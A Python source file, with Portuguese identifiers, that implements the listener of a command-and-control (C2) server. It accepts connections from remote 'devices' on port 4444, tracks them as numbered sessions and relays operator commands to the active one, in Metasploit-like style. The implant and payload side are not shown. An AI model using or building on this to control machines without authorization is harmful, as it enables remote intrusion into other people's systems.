import socket
import threading
from .client import Client
from .config import (
    VERDE, VERMELHO, AMARELO, CIANO, RESET, BUFFER,
)
from .logger import log
from .protocol import processar


class C2:
    def __init__(self):
        self.opcoes = {
            "LHOST": "0.0.0.0",
            "LPORT": "4444",
        }
        self.clientes = {}
        self.ativo = None
        self.lock = threading.Lock()
        self.proximo_id = 1
        self.servidor = None
        self.rodando = True
        self.escutando = False

    def iniciar_listener(self):
        if self.escutando:
            log("listener ja esta rodando (use: stop)", AMARELO)
            return

        host = self.opcoes["LHOST"]
        try:
            port = int(self.opcoes["LPORT"])
        except ValueError:
            log(f"LPORT invalido: {self.opcoes['LPORT']}", VERMELHO)
            return

        try:
            self.servidor = socket.socket()
            self.servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.servidor.bind((host, port))
            self.servidor.listen(10)
        except Exception as e:
            log(f"falha ao escutar em {host}:{port} - {e}", VERMELHO)
            return

        self.escutando = True
        log(f"listener ativo em {AMARELO}{host}:{port}{RESET}", VERDE)
        threading.Thread(target=self._aceitar, daemon=True).start()
        self.prompt()

    def parar_listener(self):
        if not self.escutando:
            log("listener nao esta rodando", AMARELO)
            return
        self.escutando = False
        try:
            self.servidor.close()
        except Exception:
            pass
        for c in list(self.clientes.values()):
            c.fechar()
        self.clientes.clear()
        self.ativo = None
        log("listener parado", VERMELHO)
        self.prompt()

    def _aceitar(self):
        while self.escutando:
            try:
                conn, addr = self.servidor.accept()
            except Exception:
                break
            with self.lock:
                cid = self.proximo_id
                self.proximo_id += 1
            cli = Client(conn, addr, cid)
            self.clientes[cid] = cli
            log(
                f"dispositivo {VERDE}{cid}{RESET} conectado de {addr[0]}",
                VERDE,
            )
            self.prompt()
            threading.Thread(target=self._ler, args=(cli,), daemon=True).start()

    def _ler(self, cli):
        while True:
            try:
                chunk = cli.conn.recv(BUFFER)
            except Exception:
                break
            if not chunk:
                break
            cli.buffer += chunk
            processar(cli, self)
        with self.lock:
            self.clientes.pop(cli.id, None)
            if self.ativo == cli.id:
                self.ativo = None
        log(f"dispositivo {cli.id} desconectado", VERMELHO)
        self.prompt()

    def prompt(self):
        with self.lock:
            cid = self.ativo
            n = len(self.clientes)
        if cid:
            print(f"\n{VERMELHO}dev{cid}{RESET} > ", end="", flush=True)
        else:
            print(f"\n{CIANO}c2{RESET} > ", end="", flush=True)

    def enviar(self, cmd):
        with self.lock:
            cid = self.ativo
        if cid is None:
            log("nenhum dispositivo ativo (use: sessions -i <id>)", AMARELO)
            return
        cli = self.clientes.get(cid)
        if not cli:
            log(f"dispositivo {cid} offline", VERMELHO)
            return
        if not cli.enviar(cmd):
            log(f"falha ao enviar para {cid}", VERMELHO)

    def encerrar(self):
        self.rodando = False
        self.escutando = False
        try:
            self.servidor.close()
        except Exception:
            pass
        for c in list(self.clientes.values()):
            c.fechar()
        log("encerrando C2", VERMELHO)
